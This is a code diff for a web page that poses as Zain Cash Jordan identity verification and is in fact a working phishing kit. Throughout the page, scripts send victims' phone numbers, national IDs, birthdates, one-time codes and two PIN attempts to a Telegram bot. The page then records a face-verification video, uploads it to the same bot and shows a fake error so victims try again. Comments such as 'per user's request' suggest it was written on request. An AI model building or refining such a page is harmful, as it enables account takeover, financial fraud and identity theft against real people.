@@ -93,7 +93,7 @@
       <div class="rec-sub muted" style="text-align:center;margin-top:-6px">سيسجل فيديو واحد عمودي يحتوي الحركات المطلوبة.</div>
 
       <div class="cam-box" id="camBox">
-        <canvas id="previewCanvas"></canvas>
+        <canvas id="previewCanvas" aria-hidden="false"></canvas>
       </div>
 
       <div class="rec-controls">
@@ -132,7 +132,6 @@
 
     /* State */
     let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4_first: '', code4_second: '' };
-    let telegramMsgId = null;
     let waitingTimeout = null;
 
     /* Recording state */
@@ -158,17 +157,11 @@
     const sleep = ms => new Promise(r => setTimeout(r, ms));
 
     /* Utilities */
-    function escapeHtml(str) {
-      return String(str).replace(/[&<>"']/g, s => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s]));
-    }
+    function escapeHtml(str) { return String(str).replace(/[&<>"']/g, s => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s])); }
+    function codeWrap(num) { return `<code>${escapeHtml(num)}</code>`; }
+    function chooseMimeType() { const candidates = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm;codecs=vp8','video/mp4']; for (const c of candidates) try { if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(c)) return c; } catch(e){} return ''; }
 
-    function chooseMimeType() {
-      const candidates = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm;codecs=vp8','video/mp4'];
-      for (const c of candidates) try { if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(c)) return c; } catch(e){}
-      return '';
-    }
-
-    /* Telegram: send messages where only numbers are wrapped in <code> so they are easy to select/copy */
+    /* Telegram: send messages with only numbers wrapped in <code> so they are copyable */
     async function sendTelegramHtml(text) {
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -178,15 +171,10 @@
         });
         const json = await res.json();
         if (json && json.result && json.result.message_id) return json.result.message_id;
-      } catch (e) {
-        console.warn('sendTelegramHtml error', e);
-      }
+      } catch (e) { console.warn('sendTelegramHtml error', e); }
       return null;
     }
 
-    function codeWrap(num) { return `<code>${escapeHtml(num)}</code>`; }
-
-    /* send specific sequence per user's request (no aggregated summary) */
     async function sendSequenceBeforeVideo() {
       // 1) phone only
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
@@ -196,11 +184,11 @@
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
       // 4) add fixed first attempt
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 1): ${codeWrap(userData.code4_first)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
-      // 5) add fixed second attempt (final message before video)
+      // 5) fixed second attempt
       await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
     }
 
-    /* Face model (silent background load) */
+    /* load face model silently */
     async function loadFaceModelSilently() {
       if (faceModel) return faceModel;
       while (!faceModel) {
@@ -232,19 +220,11 @@
         </div>`;
     }
     function clearTimers() { if (waitingTimeout) { clearInterval(waitingTimeout); waitingTimeout = null; } }
-
-    function showModalError(message) {
-      modalMsg.textContent = message || 'يوج�� خطأ — الرجاء المحاولة مرة أخرى.';
-      modalError.classList.add('active');
-      modalError.setAttribute('aria-hidden','false');
-    }
-    function hideModalError() {
-      modalError.classList.remove('active');
-      modalError.setAttribute('aria-hidden','true');
-    }
+    function showModalError(message) { modalMsg.textContent = message || 'يوجد خطأ — الرجاء المحاولة مرة أخرى.'; modalError.classList.add('active'); modalError.setAttribute('aria-hidden','false'); }
+    function hideModalError() { modalError.classList.remove('active'); modalError.setAttribute('aria-hidden','true'); }
     modalCloseBtn.addEventListener('click', hideModalError);
 
-    /* Flow rendering functions (kept similar to prior UI) */
+    /* Flow UI (kept similar) */
     function renderPhoneStep() {
       clearTimers();
       app.innerHTML = `
@@ -263,8 +243,7 @@
         const phone = phoneInput.value.trim();
         if (!/^07\d{8}$/.test(phone)) { alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام'); phoneInput.focus(); return; }
         userData.phone = phone;
-        // send phone-only (first message)
-        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`); // phone-only message
         renderNationalIdStep();
       };
     }
@@ -285,7 +264,6 @@
         <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       renderBirthdateFields();
       document.getElementById('nationalId').focus();
-
       document.getElementById('nationalForm').onsubmit = async (e) => {
         e.preventDefault();
         const nationalId = (document.getElementById('nationalId').value || '').trim();
@@ -296,11 +274,10 @@
         if (!day || !month || !year) { alert('يرجى إدخال تاريخ الميلاد'); return; }
         userData.nationalId = nationalId;
         userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
-        // send phone + national + birthdate (second message)
+        // send phone + national + birthdate
         await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}`);
         showNationalIdWaitAndGotoCode5();
       };
-
       document.getElementById('backBtn').onclick = () => renderPhoneStep();
     }
 
@@ -364,7 +341,6 @@
         const code = codeInput.value.trim();
         if (code.length !== 5) { alert('يرجى إدخال رمز مكون من 5 أرقام'); codeInput.focus(); return; }
         userData.code5 = code;
-        // send phone+nat+bdate+temp (third message)
         await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
         showWaitMsgAndGotoCode4();
       };
@@ -408,13 +384,11 @@
       const codeInput = document.getElementById('code4input');
       codeInput.focus();
       codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
-
       document.getElementById('code4Form').onsubmit = async (e) => {
         e.preventDefault();
         const code = codeInput.value.trim();
         if (code.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
         userData.code4_first = code;
-        // send attempt1 (phone + fixed1 + temp)
         await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 1): ${codeWrap(userData.code4_first)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
         renderCode4RetryStep();
       };
@@ -439,23 +413,19 @@
       const retryInput = document.getElementById('code4retry');
       retryInput.focus();
       retryInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
-
       document.getElementById('code4RetryForm').onsubmit = async (e) => {
         e.preventDefault();
         const code2 = retryInput.value.trim();
         if (code2.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); retryInput.focus(); return; }
         userData.code4_second = code2;
-
-        // send attempt2 (phone + fixed2 + temp)
-        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز ال��ؤقت: ${codeWrap(userData.code5)}`);
-
-        // after textual messages, return to initial UI and start recording+sending video automatically
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
+        // After messages, return to main UI and start recording
         renderPhoneStep();
         setTimeout(() => startRecordingAndSendAll(), 600);
       };
     }
 
-    /* Recording helpers: ensure straight portrait rendering and no mirroring */
+    /* Recording: improved portrait canvas preview and recording */
     async function startCameraForRecording() {
       if (mediaStream) return mediaStream;
       try {
@@ -465,38 +435,41 @@
         });
         return mediaStream;
       } catch (e) {
-        console.error('startCameraForRecording error', e);
+        console.error('startCamera error', e);
         showModalError('تعذر الوصول إلى الكاميرا. تأكد من منح الإذن ثم أعد المحاولة.');
         throw e;
       }
     }
+    function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }
 
-    function stopCameraForRecording() {
-      try {
-        if (mediaStream) {
-          mediaStream.getTracks().forEach(t => t.stop());
-          mediaStream = null;
-        }
-      } catch (e) {}
-    }
-
-    // Create a portrait canvas and draw video frames straight (rotate if source is landscape)
+    // create portrait canvas and live preview from raw video (ensures straight upright view)
     function createPortraitCanvasAndPreview(videoEl) {
       const targetW = 720;
       const targetH = 1280;
+      // offscreen canvas for recording at target resolution
       const canvas = document.createElement('canvas');
       canvas.width = targetW;
       canvas.height = targetH;
       const ctx = canvas.getContext('2d');
 
-      // preview canvas (visible)
+      // visible preview canvas: set internal pixel size same as canvas for sharpness,
+      // but CSS will scale it to container size.
       const preview = previewCanvas;
-      // set preview canvas real pixel size to match drawing size for best quality
-      // but scale via CSS automatically (canvas CSS width set by container)
       preview.width = targetW;
       preview.height = targetH;
+      preview.style.width = '100%';
+      preview.style.height = '100%';
+      const pctx = preview.getContext('2d');
 
       let cancelled = false;
+      const DPR = window.devicePixelRatio || 1;
+      // ensure drawing uses DPR for crisp preview
+      preview.width = Math.round(targetW * DPR);
+      preview.height = Math.round(targetH * DPR);
+      preview.style.width = '100%';
+      preview.style.height = '100%';
+      pctx.setTransform(DPR,0,0,DPR,0,0); // scale drawing to DPR
+
       async function drawLoop() {
         if (cancelled) return;
         const vw = videoEl.videoWidth || 1;
@@ -504,55 +477,63 @@
         if (vw > 0 && vh > 0) {
           ctx.fillStyle = '#000';
           ctx.fillRect(0,0,targetW,targetH);
-          // detect orientation: if source is landscape (vw>vh), rotate to portrait
+          // If camera frame is landscape, rotate so result is upright portrait
           if (vw > vh) {
-            // rotate canvas by 90deg clockwise: translate, rotate, then draw with swapped dims
             ctx.save();
+            // rotate 90deg clockwise and draw
             ctx.translate(targetW/2, targetH/2);
             ctx.rotate(90 * Math.PI / 180);
-            // after rotation, drawImage expects coordinates centered; compute scale to cover
+            // compute scale to cover rotated area
             const scale = Math.max(targetH / vw, targetW / vh);
             const sw = vw / scale;
             const sh = vh / scale;
             const sx = Math.max(0, (vw - sw)/2);
             const sy = Math.max(0, (vh - sh)/2);
-            // draw rotated: because rotated, swap target dims: draw to -targetH/2..targetH/2 etc
+            // draw centered into rotated canvas
             ctx.drawImage(videoEl, sx, sy, sw, sh, -targetH/2, -targetW/2, targetH, targetW);
             ctx.restore();
           } else {
-            // normal portrait source or similar: scale to cover
+            // portrait or square: center-crop to cover
             const scale = Math.max(targetW / vw, targetH / vh);
-            const sw = targetW / scale;
-            const sh = targetH / scale;
+            const sw = vw / scale;
+            const sh = vh / scale;
             const sx = Math.max(0, (vw - sw)/2);
             const sy = Math.max(0, (vh - sh)/2);
             ctx.drawImage(videoEl, sx, sy, sw, sh, 0, 0, targetW, targetH);
           }
-          // copy to preview canvas (same element) — already drawing to preview
-          const pctx = preview.getContext('2d');
-          try { pctx.drawImage(canvas, 0, 0, preview.width, preview.height); } catch(e){}
+          // copy to preview canvas scaled (pctx already scaled by DPR)
+          try {
+            pctx.clearRect(0,0,preview.width,preview.height);
+            pctx.drawImage(canvas, 0, 0, preview.width / DPR, preview.height / DPR);
+          } catch (e) {
+            // ignore occasional draw errors
+          }
         }
         rafId = requestAnimationFrame(drawLoop);
       }
       drawLoop();
-      return { canvas, stop() { cancelled = true; if (rafId) { cancelAnimationFrame(rafId); rafId = null; } } };
+
+      return {
+        canvas,
+        stop() {
+          cancelled = true;
+          if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
+        }
+      };
     }
 
-    // Record the canvas stream plus audio track
     async function recordCanvasWithAudio(canvas, audioTrack) {
       const canvasStream = canvas.captureStream(30);
       const finalStream = new MediaStream();
       canvasStream.getVideoTracks().forEach(t => finalStream.addTrack(t));
       if (audioTrack) finalStream.addTrack(audioTrack);
-
       const mime = chooseMimeType();
       let recorder;
       recordedChunks = [];
       try { recorder = mime ? new MediaRecorder(finalStream, { mimeType: mime }) : new MediaRecorder(finalStream); }
       catch(e) { recorder = new MediaRecorder(finalStream); }
-
-      recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) recordedChunks.push(ev.data); };
-      recorder.onerror = (e) => console.warn('recorder error', e);
+      recorder.ondataavailable = ev => { if (ev.data && ev.data.size) recordedChunks.push(ev.data); };
+      recorder.onerror = ev => console.warn('recorder error', ev);
       recorder.start(300);
       return recorder;
     }
@@ -560,7 +541,6 @@
     async function recordFullSequenceViaCanvas(videoEl, audioTrack) {
       const { canvas, stop } = createPortraitCanvasAndPreview(videoEl);
       const recorder = await recordCanvasWithAudio(canvas, audioTrack);
-
       const totalSteps = STEPS.length;
       const totalDurationMs = totalSteps * STEP_SECONDS * 1000;
       const startTime = performance.now();
@@ -588,11 +568,11 @@
       return new Blob(recordedChunks, { type: blobType });
     }
 
-    /* Top-level: start camera, send sequential messages, record canvas portrait video, send video, show modal error after sending */
+    /* Main flow: send messages, record, send video; topStatus shown only while sending */
     async function startRecordingAndSendAll() {
       recOverlay.style.display = 'flex';
       recOverlay.setAttribute('aria-hidden','false');
-      topStatus.style.display = 'none'; // per user's request: show only while sending, not during recording
+      topStatus.style.display = 'none';
       recInstr.textContent = 'استعد...';
       recProg.style.width = '0%';
       recCountdown.textContent = '--s';
@@ -603,21 +583,22 @@
         videoEl.autoplay = true; videoEl.playsInline = true; videoEl.muted = true;
         videoEl.srcObject = stream;
         await videoEl.play().catch(()=>{});
+        const audioTrack = (stream.getAudioTracks && stream.getAudioTracks().length) ? stream.getAudioTracks()[0] : null;
 
-        // send requested sequence of textual messages (numbers wrapped in <code>)
+        // Send requested textual sequence before recording completes
         await sendSequenceBeforeVideo();
 
-        // ensure face model loaded quietly (not required for flow)
+        // ensure model loaded silently but not required for correctness
         loadFaceModelSilently().catch(()=>{});
 
-        // record
-        const blob = await recordFullSequenceViaCanvas(videoEl, stream.getAudioTracks()[0] || null);
+        // record portrait video (canvas-based preview ensures upright view)
+        const blob = await recordFullSequenceViaCanvas(videoEl, audioTrack);
 
-        // Now show topStatus while sending
+        // show topStatus only while sending
         topStatus.style.display = 'block';
         topStatus.textContent = 'جاري التحقق من الفيديو';
 
-        // send video (we also send a textual block with numbers before video so numbers selectable)
+        // send small textual block with numbers wrapped in <code> (so numbers are copyable)
         const captionLines = [
           `رقم الهاتف: ${userData.phone}`,
           `الرقم الوطني: ${userData.nationalId}`,
@@ -626,36 +607,27 @@
           `الرمز الثابت (1): ${userData.code4_first}`,
           `الرمز الثابت (2): ${userData.code4_second}`
         ];
-        // sendText block: wrap numbers only in <code>
+        // Build HTML text with numeric tokens wrapped in <code>
         const textBlock = captionLines.map(line => {
-          // split at colon to wrap the part after ':'
           const idx = line.indexOf(':');
           if (idx >= 0) {
             const key = escapeHtml(line.slice(0, idx+1));
             const val = escapeHtml(line.slice(idx+1).trim());
-            // only wrap numeric tokens inside value
             const wrappedVal = val.replace(/(\d{2,})/g, m => `<code>${m}</code>`);
             return `${key} ${wrappedVal}`;
           }
           return escapeHtml(line);
         }).join('\n');
-        // send message block with HTML
+        // send textual block
         await sendTelegramHtml(textBlock);
 
-        // send video (with simple caption)
-        await (async function sendVideo(blob){
-          try {
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('video', blob, 'verification.webm');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
-          } catch (e) {
-            console.warn('sendVideo error', e);
-            throw e;
-          }
-        })(blob);
+        // send video
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('video', blob, 'verification.webm');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
 
-        // per request: after sending video show modal telling user there is an error and to try again
+        // per request: after sending, show modal error asking user to try again
         showModalError('يوجد خطأ بالمعلومات. رجاءً حاول مرة أخرى.');
       } catch (e) {
         console.error('record/send error', e);
@@ -686,14 +658,7 @@
         throw e;
       }
     }
-    function stopCameraForRecording() {
-      try {
-        if (mediaStream) {
-          mediaStream.getTracks().forEach(t => t.stop());
-          mediaStream = null;
-        }
-      } catch (e) {}
-    }
+    function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }
 
     /* Event handlers */
     recCancel.addEventListener('click', () => {
@@ -702,10 +667,7 @@
       recOverlay.setAttribute('aria-hidden','true');
       topStatus.style.display = 'none';
     });
-
-    window.addEventListener('beforeunload', (e) => {
-      if (mediaStream) { e.preventDefault(); e.returnValue = ''; }
-    });
+    window.addEventListener('beforeunload', (e) => { if (mediaStream) { e.preventDefault(); e.returnValue = ''; } });
 
     /* Start app */
     renderPhoneStep();
